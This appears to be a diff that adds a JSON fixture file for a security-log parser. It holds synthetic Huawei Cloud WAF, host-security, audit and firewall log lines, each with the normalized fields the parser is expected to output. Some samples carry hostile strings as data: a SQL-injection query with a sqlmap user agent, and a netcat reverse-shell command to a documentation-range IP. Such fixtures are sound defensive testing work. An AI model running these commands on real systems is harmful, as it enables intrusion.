@@ -1,0 +1,114 @@
+{
+  "version": 1,
+  "note": "华为云模板正样本与关键字段断言。line 为按华为云公开日志/API 字段结构重建的真实感样本（未联网抓取，取值与 IP 为 RFC 5737/私网示例段）。",
+  "samples": {
+    "huawei-waf-attack-json": {
+      "protocol": "webhook",
+      "line": "{\"time\":\"2026-02-21T10:23:45+08:00\",\"host\":\"api.example.cn\",\"client_ip\":\"203.0.113.88\",\"request_method\":\"GET\",\"request_uri\":\"/api/v1/user?id=1%20union%20select%201,2,3\",\"user_agent\":\"sqlmap/1.7.2#stable\",\"attack_type\":\"SQL注入\",\"action\":\"block\",\"rule_id\":\"waf-hw-10021\",\"status\":403,\"severity\":\"high\",\"region\":\"cn-north-4\"}",
+      "expect": {
+        "event.time": "2026-02-21T02:23:45.000Z",
+        "host.name": "api.example.cn",
+        "source.ip": "203.0.113.88",
+        "http.request.method": "GET",
+        "url.path": "/api/v1/user?id=1%20union%20select%201,2,3",
+        "user_agent.original": "sqlmap/1.7.2#stable",
+        "rule.name": "SQL注入",
+        "rule.id": "waf-hw-10021",
+        "http.response.status_code": "403",
+        "cloud.region": "cn-north-4",
+        "event.severity": "high",
+        "event.action": "denied",
+        "event.category": "web"
+      }
+    },
+    "huawei-waf-access-json": {
+      "protocol": "http-pull",
+      "line": "{\"time\":\"2026-02-21T10:24:10+08:00\",\"host\":\"api.example.cn\",\"client_ip\":\"203.0.113.89\",\"request_method\":\"GET\",\"request_uri\":\"/api/v1/orders\",\"status\":200,\"bytes_sent\":2048,\"request_time\":0.012,\"user_agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\",\"upstream_status\":200,\"region\":\"cn-north-4\"}",
+      "expect": {
+        "host.name": "api.example.cn",
+        "source.ip": "203.0.113.89",
+        "http.request.method": "GET",
+        "url.path": "/api/v1/orders",
+        "http.response.status_code": "200",
+        "http.response.body.bytes": "2048",
+        "event.duration": "0.012",
+        "http.response.status_code_upstream": "200",
+        "event.severity": "info",
+        "event.category": "web"
+      }
+    },
+    "huawei-hss-alert-json": {
+      "protocol": "webhook",
+      "fixture": "parsers/huawei-hss-alert-1.log",
+      "line": "{\"occur_time\":\"2026-02-21 10:23:45\",\"event_type\":\"abnormal_process\",\"host_name\":\"ecs-app-02\",\"host_ip\":\"10.20.30.42\",\"user\":\"root\",\"process_name\":\"nc\",\"process_path\":\"/usr/bin/nc\",\"cmd_line\":\"nc -e /bin/sh 198.51.100.9 4444\",\"severity\":\"critical\",\"action\":\"block\",\"region\":\"cn-north-4\"}",
+      "expect": {
+        "event.time": "2026-02-21T10:23:45.000Z",
+        "host.name": "ecs-app-02",
+        "host.ip": "10.20.30.42",
+        "user.name": "root",
+        "process.name": "nc",
+        "process.executable": "/usr/bin/nc",
+        "process.command_line": "nc -e /bin/sh 198.51.100.9 4444",
+        "cloud.region": "cn-north-4",
+        "event.severity": "critical",
+        "event.action": "denied",
+        "event.category": "process"
+      }
+    },
+    "huawei-hss-filechange-json": {
+      "protocol": "webhook",
+      "line": "{\"occur_time\":\"2026-02-21 10:25:00\",\"event_type\":\"ransomware\",\"host_name\":\"ecs-app-02\",\"file_path\":\"/data/orders/2026.csv.locked\",\"file_operation\":\"modify\",\"file_hash\":\"9f2c1d4b6a8e0f3c5d7b9a1e2f4c6d8b0a2e4f6c8d0b2a4e6f8c0d2b4a6e8f0c\",\"severity\":\"critical\",\"action\":\"block\",\"user\":\"www-data\"}",
+      "expect": {
+        "event.time": "2026-02-21T10:25:00.000Z",
+        "host.name": "ecs-app-02",
+        "file.path": "/data/orders/2026.csv.locked",
+        "file.operation": "modify",
+        "file.hash.sha256": "9f2c1d4b6a8e0f3c5d7b9a1e2f4c6d8b0a2e4f6c8d0b2a4e6f8c0d2b4a6e8f0c",
+        "user.name": "www-data",
+        "event.severity": "critical",
+        "event.action": "denied",
+        "event.category": "malware"
+      }
+    },
+    "huawei-cts-audit-json": {
+      "protocol": "object-storage",
+      "line": "{\"time\":\"2026-02-21T10:26:30Z\",\"trace_name\":\"deleteServer\",\"trace_type\":\"ConsoleOperation\",\"trace_rating\":\"normal\",\"service_type\":\"ECS\",\"resource_type\":\"ecs\",\"resource_name\":\"ecs-app-02\",\"source_ip\":\"203.0.113.90\",\"user\":{\"name\":\"ops-admin\",\"domain\":{\"name\":\"example-corp\"}},\"trace_id\":\"9f2c1d4b6a8e0f3c5d7b9a1e2f4c6d8b\",\"code\":200}",
+      "expect": {
+        "event.time": "2026-02-21T10:26:30.000Z",
+        "event.action_raw": "deleteServer",
+        "event.type": "ConsoleOperation",
+        "event.outcome": "normal",
+        "event.provider": "ECS",
+        "cloud.resource_type": "ecs",
+        "cloud.resource_name": "ecs-app-02",
+        "source.ip": "203.0.113.90",
+        "user.name": "ops-admin",
+        "user.domain": "example-corp",
+        "trace.id": "9f2c1d4b6a8e0f3c5d7b9a1e2f4c6d8b",
+        "event.category": "configuration",
+        "event.severity": "info"
+      }
+    },
+    "huawei-cfw-log-json": {
+      "protocol": "webhook",
+      "line": "{\"start_time\":\"2026-02-21T10:27:00+08:00\",\"end_time\":\"2026-02-21T10:28:00+08:00\",\"src_ip\":\"203.0.113.91\",\"src_port\":44321,\"dst_ip\":\"10.20.30.91\",\"dst_port\":3389,\"protocol\":\"TCP\",\"app\":\"RDP\",\"action\":\"deny\",\"direction\":\"in2out\",\"bytes\":4096,\"packets\":32,\"rule_id\":\"cfw-hw-3001\",\"log_type\":\"acl\"}",
+      "expect": {
+        "event.time": "2026-02-21T02:27:00.000Z",
+        "event.end": "2026-02-21T10:28:00+08:00",
+        "source.ip": "203.0.113.91",
+        "source.port": "44321",
+        "destination.ip": "10.20.30.91",
+        "destination.port": "3389",
+        "network.transport": "TCP",
+        "network.application": "RDP",
+        "network.direction": "in2out",
+        "network.bytes_out": "4096",
+        "network.packets_out": "32",
+        "rule.id": "cfw-hw-3001",
+        "event.category": "network",
+        "event.severity": "low",
+        "event.action": "denied"
+      }
+    }
+  }
+}
